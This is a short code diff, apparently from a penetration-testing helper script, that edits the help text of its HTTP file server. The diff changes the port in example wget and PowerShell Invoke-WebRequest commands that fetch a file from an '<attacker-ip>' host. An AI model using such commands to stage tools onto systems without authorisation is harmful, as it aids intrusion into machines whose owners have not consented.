@@ -34,8 +34,8 @@ def start_http_server(port=8000, root_dir="."):
         print(f"{bcolors.YELLOW}[i] For python2 and below: python -m SimpleHTTPServer {port[0]}\n")
         print(f"{bcolors.OKCYAN}Ctrl+c to stop the web server\n")
         print(f"{bcolors.YELLOW}Here is how to fetch from the  webserver:")
-        print("[i] Example (Linux): wget http://<attacker-ip>:8000/file")
-        print("[i] Example (Windows PS): Invoke-WebRequest -Uri http://<attacker-ip>:8000/file -OutFile file")
+        print("[i] Example (Linux): wget http://<attacker-ip>:<port>/file")
+        print("[i] Example (Windows PS): Invoke-WebRequest -Uri http://<attacker-ip>:<port>/file -OutFile file")
         print(tips[2])
 
         httpd.serve_forever()
